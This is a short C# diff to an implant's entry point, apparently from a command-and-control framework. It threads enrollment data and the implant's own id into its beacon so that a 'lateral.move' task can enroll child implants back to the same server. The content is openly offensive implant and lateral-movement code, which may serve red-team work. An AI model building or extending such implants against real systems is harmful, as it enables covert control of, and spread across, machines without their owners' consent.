@@ -69,7 +69,7 @@ internal static class ImplantApp
         Enrollment enrollment;
         try
         {
-            enrollment = await C2.EnrollAsync(enrollUrl, config.StagerToken, privateKey, serverCAs, config.Transport, cts.Token);
+            enrollment = await C2.EnrollAsync(enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, cts.Token);
         }
         catch (Exception ex)
         {
@@ -82,9 +82,22 @@ internal static class ImplantApp
         if (beaconUrl.Length == 0)
             beaconUrl = Endpoints.BeaconUrlFromEnroll(config.EnrollURL);
 
+        // The lateral.move handler re-enrolls a child against the same enroll path,
+        // naming this implant as parent (architecture.md Sec 10.1). Carry the enroll
+        // inputs and the parent's own id into the runner so a dispatched lateral.move
+        // can derive a child that enrolls back. The child's stager token arrives in
+        // the task arguments, not here: this implant's own token is already spent.
+        var enroll = new EnrollBundle
+        {
+            Url = enrollUrl,
+            ParentId = enrollment.ImplantId,
+            Profile = config.Transport,
+            CAs = serverCAs,
+        };
+
         var beacon = new Beacon(
             beaconUrl, enrollment.ImplantId, enrollment.Leaf, enrollment.PrivateKey, enrollment.CAs,
-            config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, Console.Error);
+            config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll, Console.Error);
         try
         {
             await beacon.RunAsync(cts.Token);
